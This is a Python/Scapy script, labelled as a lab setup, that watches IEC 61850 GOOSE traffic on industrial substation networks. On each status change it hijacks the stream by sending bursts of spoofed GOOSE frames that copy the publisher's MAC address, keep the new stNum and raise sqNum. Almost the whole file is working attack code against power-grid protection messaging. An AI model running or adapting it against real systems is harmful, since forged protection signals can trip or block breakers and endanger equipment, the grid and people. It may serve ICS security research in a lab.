import time
import struct
import threading
from scapy.all import *

# --- LAB CONFIGURATION ---
INTERFACE = "Ethernet"
TARGET_APPIDS = [0x0003, 0x0004, 0x0006]
TOTAL_PACKET_BUDGET = 12
VLAN_PRIORITY = 4 # Common for GOOSE
VLAN_ID = 0
FIXED_DELAY = 0.001 # Reduced to 1ms for tighter timing

# Get local MAC to ignore our own traffic
MY_MAC = get_if_hwaddr(INTERFACE)
BPF_FILTER = "ether proto 0x88b8 or (vlan and ether proto 0x88b8)"
live_states = {}

try:
    send_sock = conf.L2socket(iface=INTERFACE)
except Exception as e:
    print(f"[-] Scapy requires Admin privileges: {e}")
    exit()

def decode_ber_len(data, offset):
    first_byte = data[offset]
    if first_byte < 0x80:
        return first_byte, 1
    n = first_byte & 0x7f
    return int.from_bytes(data[offset + 1 : offset + 1 + n], 'big'), n + 1

def encode_ber_int(tag, value):
    val_bytes = value.to_bytes((value.bit_length() // 8) + 1, byteorder='big')
    if len(val_bytes) > 1 and val_bytes[0] == 0x00 and not (val_bytes[1] & 0x80):
        val_bytes = val_bytes[1:]
    return bytes([tag, len(val_bytes)]) + val_bytes

def patch_goose_lengths(pdu):
    raw_pdu = bytearray(pdu)
    total_len = len(raw_pdu)
    raw_pdu[2:4] = struct.pack("!H", total_len)
    
    if raw_pdu[9] == 0x81:
        raw_pdu[10] = total_len - 11
    elif raw_pdu[9] == 0x82:
        raw_pdu[10:12] = struct.pack("!H", total_len - 12)
    else:
        raw_pdu[9] = total_len - 10
    return bytes(raw_pdu)

def get_structural_map(pdu):
    mapping = {}
    if len(pdu) < 10 or pdu[8] != 0x61: return None
    
    apdu_len, len_size = decode_ber_len(pdu, 9)
    ptr = 9 + len_size
    limit = ptr + apdu_len
    
    while ptr < limit:
        tag = pdu[ptr]
        v_len, l_size = decode_ber_len(pdu, ptr + 1)
        if tag in [0x85, 0x86]:
            mapping[tag] = {'start': ptr, 'end': ptr + 1 + l_size + v_len}
        if tag == 0xab:
            break
        ptr += 1 + l_size + v_len
    return mapping if (0x85 in mapping and 0x86 in mapping) else None

def launch_hijack_burst(appid, trigger_st, trigger_sq, blueprint):
    """Background thread optimized for minimal jitter."""
    thread_name = threading.current_thread().name
    
    header = raw(Ether(src=blueprint["src_mac"], dst=blueprint["dst_mac"]) / 
                  Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88b8))
    
    pdu = blueprint["pdu"]
    m = blueprint["map"]

    # --- OPTIMIZATION: PRE-CALCULATE ALL PACKETS ---
    burst_buffer = []
    for i in range(TOTAL_PACKET_BUDGET):
        attack_sq = trigger_sq + 1 + i 
        st_tlv = encode_ber_int(0x85, trigger_st)
        sq_tlv = encode_ber_int(0x86, attack_sq)
        
        new_pdu = (pdu[:m[0x85]['start']] + st_tlv + 
                   pdu[m[0x85]['end']:m[0x86]['start']] + sq_tlv + 
                   pdu[m[0x86]['end']:])
        
        burst_buffer.append(header + patch_goose_lengths(new_pdu))

    # --- EXECUTION: SEND PRE-BUILT PACKETS ---
    print(f"\n[!!!] [{thread_name}] FIRING PRE-CALCULATED BURST: {hex(appid)}")
    for packet in burst_buffer:
        send_sock.send(packet)
        if FIXED_DELAY > 0:
            time.sleep(FIXED_DELAY)
        
    print(f"[*] [{thread_name}] Burst complete.")

def monitor_and_react(pkt):
    if pkt.src == MY_MAC: return

    try:
        raw_pkt = raw(pkt)
        offset = 18 if pkt.haslayer(Dot1Q) else 14
        appid = struct.unpack("!H", raw_pkt[offset:offset+2])[0]
        
        if appid not in TARGET_APPIDS: return

        pdu = raw_pkt[offset:]
        s_map = get_structural_map(pdu)
        if not s_map: return

        st_val_off = s_map[0x85]['start'] + 2 
        sq_val_off = s_map[0x86]['start'] + 2
        
        current_st = int.from_bytes(pdu[st_val_off : s_map[0x85]['end']], 'big')
        current_sq = int.from_bytes(pdu[sq_val_off : s_map[0x86]['end']], 'big')

        if appid not in live_states:
            live_states[appid] = {"st": current_st}
            print(f"[+] Tracking {hex(appid)} | stNum: {current_st}")
            return

        # Trigger on state change
        if current_st != live_states[appid]["st"]:
            live_states[appid]["st"] = current_st
            
            blueprint = {
                "pdu": pdu,
                "map": s_map,
                "src_mac": pkt.src,
                "dst_mac": pkt.dst
            }
            
            # Offload to thread to keep the sniffer free
            t = threading.Thread(
                target=launch_hijack_burst, 
                args=(appid, current_st, current_sq, blueprint),
                name=f"Attack-{hex(appid)}"
            )
            t.daemon = True 
            t.start()

    except Exception:
        pass

def main():
    print(f"[*] Monitoring {INTERFACE} for GOOSE traffic...")
    sniff(iface=INTERFACE, filter=BPF_FILTER, prn=monitor_and_react, store=0)

if __name__ == "__main__":
    main()